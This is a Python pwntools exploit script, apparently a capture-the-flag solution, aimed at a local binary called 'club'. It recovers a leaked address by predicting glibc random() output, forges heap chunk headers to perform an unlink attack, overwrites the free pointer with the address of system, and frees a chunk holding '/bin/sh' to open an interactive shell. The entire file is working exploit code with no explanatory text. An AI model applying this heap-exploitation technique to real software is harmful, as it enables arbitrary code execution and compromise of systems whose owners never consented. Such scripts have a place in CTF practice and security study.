from pwn import *


def get(index, size):
	p.sendline('1')
	p.recvuntil('> ')
	p.sendline(str(index))
	p.recvuntil('> ')
	p.sendline(str(size))
	p.recvuntil('> ')

def destory(index):
	p.sendline('2')
	p.recvuntil('> ')
	p.sendline(str(index))
	p.recvuntil('> ')

def write(index, string):
	p.sendline('3')
	p.recvuntil('> ')
	p.sendline(str(index))
	p.sendline(string)
	p.recvuntil('> ')

def show(index):
	p.sendline('4')
	p.recvuntil('> ')
	p.sendline(str(index))
	return p.recvline()

def guess(num=0):
	p.recvuntil('exit\n>')
	p.sendline('5')
	p.recvuntil('guess:\n>')
	p.sendline(str(num))
	return p.recvline()

def getSeedAddress():
	numl = []
	for i in range(31):
		d = guess()
		number = int(d[d.index('is')+2:-2])
		numl.append(number)
	newNumber = (numl[31-3] + numl[31-31]) & 0x7fffffff
	d = guess(newNumber)
	if 'G00d' in d:
		return int(d[d.index('secret: ')+8:-2])

context(os='linux', arch='i386')
# context.log_level = 'debug'

p = process('./club')
elf = ELF('./club')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
seedAddress = getSeedAddress()
while not seedAddress:
	seedAddress = getSeedAddress()
offset = seedAddress - 0x55859B785148

chunkPointer = 0x55859B785100 + offset
freePointer = 0x55859B785018 + offset
# exitPointer = 0x55859B584194 + offset
# print '[+]chunk at:', hex(chunkPointer)
# print '[+]free at:', hex(freePointer)

get(2, 0x100)
get(3, 0x150)
destory(2)
destory(3)
get(4, 0x260)
write(4, p64(0)+p64(0x101)+p64(chunkPointer+0x20-0x18)+p64(chunkPointer+0x20-0x10)+'a'*(0x100-0x20)+p64(0x100)+p64(0x160))
destory(3)
write(4, p64(0)+p64(freePointer))
show(2)
p.recv()
free = u64(p.recv(6)+'\x00\x00')
system = libc.symbols['system'] - libc.symbols['free'] + free
# print '[+]system address:', hex(system)
# gdb.attach(p)
write(2, p64(system))
write(3, '/bin/sh\x00')
destory(3)

p.interactive()
